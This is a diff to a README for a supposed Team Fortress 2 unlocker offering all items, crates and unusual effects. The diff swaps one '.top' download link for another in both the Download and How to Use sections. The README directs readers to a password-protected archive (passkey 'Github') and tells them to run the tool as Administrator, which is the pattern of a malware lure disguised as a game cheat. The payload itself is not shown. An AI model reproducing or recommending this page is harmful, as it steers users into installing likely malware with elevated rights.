@@ -6,7 +6,7 @@ Team Fortress 2 unlocker with all items, crates, unusual effects, taunts, and lo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular mods like **TF2ItemSchema**, **OpenSourceTF2**, and **Steam Ach
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Team Fortress 2.
 4. Run the tool **as Administrator**.
